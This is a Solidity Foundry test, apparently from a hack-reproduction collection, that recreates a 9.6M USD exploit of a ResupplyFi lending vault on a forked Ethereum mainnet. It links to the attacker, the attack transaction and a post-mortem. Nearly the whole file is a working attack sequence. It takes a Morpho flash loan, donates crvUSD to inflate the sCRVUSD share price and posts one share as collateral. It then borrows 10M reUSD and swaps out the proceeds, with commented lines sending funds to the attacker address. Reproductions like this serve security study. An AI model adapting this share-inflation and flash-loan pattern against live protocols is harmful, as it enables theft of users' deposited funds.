// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";

// @KeyInfo - Total Lost : 9.6M USD
// Attacker : https://etherscan.io/address/0x6d9f6e900ac2ce6770fd9f04f98b7b0fc355e2ea
// Attack Contract : https://etherscan.io/address/0xf90da523a7c19a0a3d8d4606242c46f1ee459dc7
// Vulnerable Contract : https://etherscan.io/address/0x6e90c85a495d54c6d7E1f3400FEF1f6e59f86bd6
// Attack Tx : https://etherscan.io/tx/0xffbbd492e0605a8bb6d490c3cd879e87ff60862b0684160d08fd5711e7a872d3

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x6e90c85a495d54c6d7E1f3400FEF1f6e59f86bd6#code

// @Analysis
// Post-mortem : https://mirror.xyz/0x521CB9b35514E9c8a8a929C890bf1489F63B2C84/ygJ1kh6satW9l_NDBM47V87CfaQbn2q0tWy_rtp76OI
// Twitter Guy : https://x.com/peckshield/status/1938061948647817647
// Hacking God : N/A
pragma solidity ^0.8.0;

interface IERC20 {
    function approve(address,uint256) external;
    function balanceOf(address) external view returns (uint256);
    function transfer(address,uint256) external;
}

interface ICurvePool {
    function exchange(int128,int128,uint256,uint256) external;
}

interface IsCRVUSD {
    function mint(uint256) external;
    function approve(address,uint256) external;
    function balanceOf(address) external view returns (uint256);
    function redeem(uint256,address,address) external;
}

interface IResupplyVault {
    function addCollateralVault(uint256,address) external;
    function borrow(uint256,uint256,address) external;
}

interface IUniswapV3Pool {
    function swap(address,bool,int256,uint160,bytes calldata) external;
}

interface IWETH {
    function balanceOf(address) external view returns (uint256);
    function withdraw(uint256) external;
}

interface IMorphoBlue {
        function flashLoan(address,uint256,bytes calldata) external;
}
contract ResupplyFi is BaseTestWithBalanceLog {

    address USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address CRVUSD = 0xf939E0A03FB07F59A73314E73794Be0E57ac1b4E;
    address SCRVUSD = 0x0655977FEb2f289A4aB78af67BAB0d17aAb84367;
    address REUSD = 0x57aB1E0003F623289CD798B1824Be09a793e4Bec;
    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;


    address MorphoBlue = 0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb;
    
    // Additional contract addresses for readability
    address CURVE_USDC_CRVUSD_POOL = 0x4DEcE678ceceb27446b35C672dC7d61F30bAD69E;
    address SCRVUSD_CONTRACT = 0x01144442fba7aDccB5C9DC9cF33dd009D50A9e1D;
    address RESUPPLY_VAULT = 0x6e90c85a495d54c6d7E1f3400FEF1f6e59f86bd6;
    address CURVE_REUSD_POOL = 0xc522A6606BBA746d7960404F22a3DB936B6F4F50;
    address UNISWAP_V3_POOL = 0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640;
    address ATTACKER_EOA = 0x6D9f6E900ac2CE6770Fd9f04f98B7B0fc355E2EA;

    uint256 blocknumToForkFrom = 22785460;

    receive() external payable {}

    function setUp() public {
        vm.createSelectFork("mainnet", blocknumToForkFrom);
        //Change this to the target token to get token balance of,Keep it address 0 if its ETH that is gotten at the end of the exploit
        fundingToken = USDC;
    }


    function testExploit() public balanceLog {
        //implement exploit code here
        TokenHelper.approveToken(USDC, MorphoBlue, type(uint256).max);
        IMorphoBlue(MorphoBlue).flashLoan(USDC, 4000000000, hex"");
    }

    function onMorphoFlashLoan(uint fundsin,bytes calldata callstuff) external {
        require(msg.sender == MorphoBlue);

        IERC20(USDC).approve(CURVE_USDC_CRVUSD_POOL, type(uint256).max);

       ICurvePool(CURVE_USDC_CRVUSD_POOL).exchange(0, 1, 4000000000, 0);

        IERC20(CRVUSD).transfer(0x89707721927d7aaeeee513797A8d6cBbD0e08f41, 2000000000000000000000);

        IERC20(CRVUSD).approve(SCRVUSD_CONTRACT, type(uint256).max);

        IsCRVUSD(SCRVUSD_CONTRACT).mint(1);

       IsCRVUSD(SCRVUSD_CONTRACT).approve(RESUPPLY_VAULT, type(uint256).max);

        IResupplyVault(RESUPPLY_VAULT).addCollateralVault(1, address(this));

        IResupplyVault(RESUPPLY_VAULT).borrow(10000000000000000000000000, 0, address(this));

        IERC20(REUSD).balanceOf(address(this));

        IERC20(REUSD).approve(CURVE_REUSD_POOL, type(uint256).max);

        ICurvePool(CURVE_REUSD_POOL).exchange(0, 1, 10000000000000000000000000, 0);

        IsCRVUSD(SCRVUSD).balanceOf(address(this));

        IsCRVUSD(SCRVUSD).redeem(9339517438774044859087480, address(this), address(this));

        IERC20(CRVUSD).balanceOf(address(this));

        IERC20(CRVUSD).approve(CURVE_USDC_CRVUSD_POOL, type(uint256).max);

        ICurvePool(CURVE_USDC_CRVUSD_POOL).exchange(1, 0, 9813732911624644332019633, 0);

        IERC20(USDC).balanceOf(address(this));

       IUniswapV3Pool(UNISWAP_V3_POOL).swap(address(this), true, 9806396552565, 1538192050659009469342694006439525, hex"");


        // Call data: 0x0000000000000000000000006d9f6e900ac2ce6770fd9f04f98b7b0fc355e2ea00000000000000000000000000000000000000000000000000000349f3bc6259
        // IERC20(USDC).transfer(ATTACKER_EOA, 3616156705369);

        // Call data: 0x000000000000000000000000151aa63dbb7c605e7b0a173ab7375e1450e79238
        // IWETH(WETH).balanceOf(address(this));

        // Call data: 0x00000000000000000000000000000000000000000000008345c1ecf40e401ce3
        // IWETH(WETH).withdraw(2421550032848028703971);
    }

        function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external {
         IERC20(USDC).transfer(UNISWAP_V3_POOL, 6190239847196);
        }
}
